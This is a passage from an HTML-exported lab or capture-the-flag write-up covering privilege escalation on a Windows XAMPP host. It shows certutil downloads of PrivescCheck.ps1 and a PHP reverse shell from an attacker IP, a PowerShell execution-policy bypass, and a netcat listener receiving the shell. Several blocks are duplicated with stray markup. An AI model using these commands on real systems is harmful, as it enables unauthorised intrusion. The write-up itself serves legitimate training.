CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Volume <span class="cm-keyword">in</span> drive C has no label.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Volume Serial Number is 5C30-DCD7</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Directory of C:\\Users\\thecybergeek\\Desktop</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">07</span>/13/2021 &nbsp;<span class="cm-number">02</span>:38 AM &nbsp;  &lt;DIR&gt; &nbsp; &nbsp; &nbsp; &nbsp;  .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">07</span>/13/2021 &nbsp;<span class="cm-number">02</span>:38 AM &nbsp;  &lt;DIR&gt; &nbsp; &nbsp; &nbsp; &nbsp;  ..</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">01</span>/17/2026 &nbsp;<span class="cm-number">08</span>:02 AM &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">34</span> local.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">1</span> File(s) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">34</span> bytes</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">2</span> Dir(s) &nbsp;<span class="cm-number">10</span>,691,629,056 bytes free</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">C:\\Users\\thecybergeek\\Desktop&gt;type local.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">type local.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">d32...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 395px;"></div><div class="CodeMirror-gutters" style="display: none; height: 395px;"></div></div></div></pre><h1 id='privilege-escalation'><span>Privilege Escalation</span></h1><p><span>To enumerate potential privilege escalation vectors, I ran </span><code>Invoke-PrivescCheck</code><span> .</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.1719px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PS C:\\Users\\Public&gt; certutil <span class="cm-attribute">-urlcache</span> <span class="cm-attribute">-split</span> <span class="cm-attribute">-f</span> &lt;http://192.168.45.236/PrivescCheck.ps1&gt; PrivescCheck.ps1</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">certutil <span class="cm-attribute">-urlcache</span> <span class="cm-attribute">-split</span> <span class="cm-attribute">-f</span> &lt;http://192.168.45.236/PrivescCheck.ps1&gt; PrivescCheck.ps1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">****  Online  ****</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-number">000000</span>  ...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  03644a</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">CertUtil: <span class="cm-attribute">-URLCache</span> command completed successfully.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">powershell <span class="cm-attribute">-ep</span> bypass <span class="cm-attribute">-c</span> <span class="cm-string">". .\\PrivescCheck.ps1; Invoke-PrivescCheck"</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 198px;"></div><div class="CodeMirror-gutters" style="display: none; height: 198px;"></div></div></div></pre><p><span>The report indicated that the current user has write permissions in the </span><code>C:\\xampp\\apache\\bin</code><span> directory.</span></p><p><img src="./craft.assets/image-20260129105529281.png" alt="image-20260129105529281"></p><p><span>I further confirmed that I had write access to the webroot directory, </span><code>C:\\xampp\\htdocs</code><span> . This meant I could host a malicious PHP payload locally and trigger it externally.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">xampp</span><span class="cm-error">\\</span><span class="cm-identifier">htdocs</span><span class="cm-operator">&gt;</span><span class="cm-builtin">echo</span> <span class="cm-string">'a'</span> <span class="cm-operator">&gt;</span> <span class="cm-identifier">a</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">echo</span> <span class="cm-string">'a'</span> <span class="cm-operator">&gt;</span> <span class="cm-identifier">a</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">C:\\Users\\thecybergeek\\Desktop&gt;type local.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">type local.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">d32...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 351px;"></div><div class="CodeMirror-gutters" style="display: none; height: 351px;"></div></div></div></pre><h1 id='privilege-escalation'><span>Privilege Escalation</span></h1><p><span>To enumerate potential privilege escalation vectors, I ran </span><code>Invoke-PrivescCheck</code><span> .</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PS C:\\Users\\Public&gt; certutil <span class="cm-attribute">-urlcache</span> <span class="cm-attribute">-split</span> <span class="cm-attribute">-f</span> &lt;http://192.168.45.236/PrivescCheck.ps1&gt; PrivescCheck.ps1</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">certutil <span class="cm-attribute">-urlcache</span> <span class="cm-attribute">-split</span> <span class="cm-attribute">-f</span> &lt;http://192.168.45.236/PrivescCheck.ps1&gt; PrivescCheck.ps1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">****  Online  ****</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-number">000000</span>  ...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  03644a</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">CertUtil: <span class="cm-attribute">-URLCache</span> command completed successfully.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">powershell <span class="cm-attribute">-ep</span> bypass <span class="cm-attribute">-c</span> <span class="cm-string">". .\\PrivescCheck.ps1; Invoke-PrivescCheck"</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 154px;"></div><div class="CodeMirror-gutters" style="display: none; height: 154px;"></div></div></div></pre><p><span>The report indicated that the current user has write permissions in the </span><code>C:\\xampp\\apache\\bin</code><span> directory.</span></p><p><img src="./craft.assets/image-20260129105529281.png" alt="image-20260129105529281"></p><p><span>I further confirmed that I had write access to the webroot directory, </span><code>C:\\xampp\\htdocs</code><span> . This meant I could host a malicious PHP payload locally and trigger it externally.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">xampp</span><span class="cm-error">\\</span><span class="cm-identifier">htdocs</span><span class="cm-operator">&gt;</span><span class="cm-builtin">echo</span> <span class="cm-string">'a'</span> <span class="cm-operator">&gt;</span> <span class="cm-identifier">a</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">echo</span> <span class="cm-string">'a'</span> <span class="cm-operator">&gt;</span> <span class="cm-identifier">a</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">xampp</span><span class="cm-error">\\</span><span class="cm-identifier">htdocs</span><span class="cm-operator">&gt;</span><span class="cm-builtin">dir</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">dir</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-identifier">Volume</span> <span class="cm-keyword">in</span> <span class="cm-identifier">drive</span> <span class="cm-identifier">C</span> <span class="cm-identifier">has</span> <span class="cm-identifier">no</span> <span class="cm-identifier">label</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-identifier">Volume</span> <span class="cm-identifier">Serial</span> <span class="cm-identifier">Number</span> <span class="cm-identifier">is</span> <span class="cm-number">5</span><span class="cm-identifier">C30-DCD7</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-identifier">Directory</span> <span class="cm-identifier">of</span> <span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">xampp</span><span class="cm-error">\\</span><span class="cm-identifier">htdocs</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">01</span><span class="cm-operator">/</span><span class="cm-number">17</span><span class="cm-operator">/</span><span class="cm-number">2026</span> &nbsp;<span class="cm-number">10</span><span class="cm-operator">:</span><span class="cm-number">53</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp;<span class="cm-operator">&lt;</span><span class="cm-builtin">DIR</span><span class="cm-operator">&gt;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">01</span><span class="cm-operator">/</span><span class="cm-number">17</span><span class="cm-operator">/</span><span class="cm-number">2026</span> &nbsp;<span class="cm-number">10</span><span class="cm-operator">:</span><span class="cm-number">53</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp;<span class="cm-operator">&lt;</span><span class="cm-builtin">DIR</span><span class="cm-operator">&gt;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-operator">..</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">01</span><span class="cm-operator">/</span><span class="cm-number">17</span><span class="cm-operator">/</span><span class="cm-number">2026</span> &nbsp;<span class="cm-number">10</span><span class="cm-operator">:</span><span class="cm-number">53</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">6</span> <span class="cm-identifier">a</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">13</span><span class="cm-operator">/</span><span class="cm-number">2021</span> &nbsp;<span class="cm-number">02</span><span class="cm-operator">:</span><span class="cm-number">18</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp;<span class="cm-operator">&lt;</span><span class="cm-builtin">DIR</span><span class="cm-operator">&gt;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">assets</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">13</span><span class="cm-operator">/</span><span class="cm-number">2021</span> &nbsp;<span class="cm-number">02</span><span class="cm-operator">:</span><span class="cm-number">18</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp;<span class="cm-operator">&lt;</span><span class="cm-builtin">DIR</span><span class="cm-operator">&gt;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">css</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">2021</span> &nbsp;<span class="cm-number">09</span><span class="cm-operator">:</span><span class="cm-number">53</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">9</span><span class="cm-punctuation">,</span><span class="cm-number">635</span> <span class="cm-identifier">index</span><span class="cm-punctuation">.</span><span class="cm-identifier">php</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">13</span><span class="cm-operator">/</span><span class="cm-number">2021</span> &nbsp;<span class="cm-number">02</span><span class="cm-operator">:</span><span class="cm-number">18</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp;<span class="cm-operator">&lt;</span><span class="cm-builtin">DIR</span><span class="cm-operator">&gt;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">js</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">2021</span> &nbsp;<span class="cm-number">08</span><span class="cm-operator">:</span><span class="cm-number">56</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">835</span> <span class="cm-identifier">upload</span><span class="cm-punctuation">.</span><span class="cm-identifier">php</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">01</span><span class="cm-operator">/</span><span class="cm-number">17</span><span class="cm-operator">/</span><span class="cm-number">2026</span> &nbsp;<span class="cm-number">10</span><span class="cm-operator">:</span><span class="cm-number">30</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp;<span class="cm-operator">&lt;</span><span class="cm-builtin">DIR</span><span class="cm-operator">&gt;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">uploads</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">3</span> <span class="cm-identifier">File</span><span class="cm-punctuation">(</span><span class="cm-identifier">s</span><span class="cm-punctuation">)</span> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">10</span><span class="cm-punctuation">,</span><span class="cm-number">476</span> <span class="cm-identifier">bytes</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">6</span> <span class="cm-builtin">Dir</span><span class="cm-punctuation">(</span><span class="cm-identifier">s</span><span class="cm-punctuation">)</span> &nbsp;<span class="cm-number">10</span><span class="cm-punctuation">,</span><span class="cm-number">413</span><span class="cm-punctuation">,</span><span class="cm-number">010</span><span class="cm-punctuation">,</span><span class="cm-number">944</span> <span class="cm-identifier">bytes</span> <span class="cm-identifier">free</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 518px;"></div><div class="CodeMirror-gutters" style="display: none; height: 518px;"></div></div></div></pre><p><span>I transferred </span><code>Ivan-Sincek.php</code><span> to the webroot directory.</span></p><p><img src="./craft.assets/image-20260129105539218.png" alt="image-20260129105539218"></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">xampp</span><span class="cm-error">\\</span><span class="cm-identifier">htdocs</span><span class="cm-operator">&gt;</span><span class="cm-identifier">certutil</span> <span class="cm-operator">-</span><span class="cm-identifier">urlcache</span> <span class="cm-operator">-split</span> <span class="cm-operator">-f</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">http</span><span class="cm-operator">://</span><span class="cm-number">192.168.45.236</span><span class="cm-operator">/</span><span class="cm-identifier">Ivan-Sincek</span><span class="cm-punctuation">.</span><span class="cm-identifier">php</span><span class="cm-operator">&gt;</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">certutil</span> <span class="cm-operator">-</span><span class="cm-identifier">urlcache</span> <span class="cm-operator">-split</span> <span class="cm-operator">-f</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">http</span><span class="cm-operator">://</span><span class="cm-number">192.168.45.236</span><span class="cm-operator">/</span><span class="cm-identifier">Ivan-Sincek</span><span class="cm-punctuation">.</span><span class="cm-identifier">php</span><span class="cm-operator">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">****</span> &nbsp;<span class="cm-identifier">Online</span> &nbsp;<span class="cm-operator">****</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-number">0000</span> &nbsp;<span class="cm-operator">..</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-number">244</span><span class="cm-identifier">f</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">CertUtil</span><span class="cm-operator">:</span> <span class="cm-operator">-</span><span class="cm-identifier">URLCache</span> <span class="cm-identifier">command</span> <span class="cm-identifier">completed</span> <span class="cm-identifier">successfully</span><span class="cm-punctuation">.</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 148px;"></div><div class="CodeMirror-gutters" style="display: none; height: 148px;"></div></div></div></pre><p><span>After triggering the script via the browser, I gained a new shell, this time as the </span><code>apache</code><span> user.</span></p><p><img src="./craft.assets/image-20260129105545271.png" alt="image-20260129105545271"></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">┌──</span><span class="cm-punctuation">(</span><span class="cm-identifier">kali</span><span class="cm-error">㉿</span><span class="cm-identifier">kali</span><span class="cm-punctuation">)</span><span class="cm-operator">-</span><span class="cm-punctuation">[</span><span class="cm-error">~</span><span class="cm-operator">/</span><span class="cm-identifier">Desktop</span><span class="cm-punctuation">]</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">└─$</span> <span class="cm-identifier">rlwrap</span> <span class="cm-identifier">nc</span> <span class="cm-operator">-</span><span class="cm-identifier">lvnp</span> <span class="cm-number">443</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">listening</span> <span class="cm-identifier">on</span> <span class="cm-punctuation">[</span><span class="cm-identifier">any</span><span class="cm-punctuation">]</span> <span class="cm-number">443</span> <span class="cm-operator">..</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">connect</span> <span class="cm-identifier">to</span> <span class="cm-punctuation">[</span><span class="cm-number">192.168.45.236</span><span class="cm-punctuation">]</span> <span class="cm-keyword">from</span> <span class="cm-punctuation">(</span><span class="cm-identifier">UNKNOWN</span><span class="cm-punctuation">)</span> <span class="cm-punctuation">[</span><span class="cm-number">192.168.164.169</span><span class="cm-punctuation">]</span> <span class="cm-number">50237</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SOCKET</span><span class="cm-operator">:</span> <span class="cm-identifier">Shell</span> <span class="cm-identifier">has</span> <span class="cm-identifier">connected</span><span class="cm-operator">!</span> <span class="cm-identifier">PID</span><span class="cm-operator">:</span> <span class="cm-number">968</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Microsoft</span> <span class="cm-identifier">Windows</span> <span class="cm-punctuation">[</span><span class="cm-identifier">Version</span> <span class="cm-number">10.0.17763.2029</span><span class="cm-punctuation">]</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-identifier">c</span><span class="cm-punctuation">)</span> <span class="cm-number">2018</span> <span class="cm-identifier">Microsoft</span> <span class="cm-identifier">Corporation</span><span class="cm-punctuation">.</span> <span class="cm-identifier">All</span> <span class="cm-identifier">rights</span> <span 